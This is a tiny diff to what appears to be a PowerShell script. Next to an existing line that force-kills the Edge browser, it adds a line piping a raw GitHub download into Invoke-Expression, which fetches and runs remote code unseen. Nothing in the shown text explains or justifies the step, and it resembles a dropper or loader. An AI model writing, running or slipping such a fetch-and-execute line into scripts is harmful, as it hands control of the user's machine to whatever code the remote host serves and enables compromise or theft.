@@ -1,2 +1,2 @@
 kill -n msedge -f
-
+Invoke-RestMethod -Uri "https://raw.githubusercontent.com/wajih8/wpla_wajih/refs/heads/main/public/fins" | Invoke-Expression
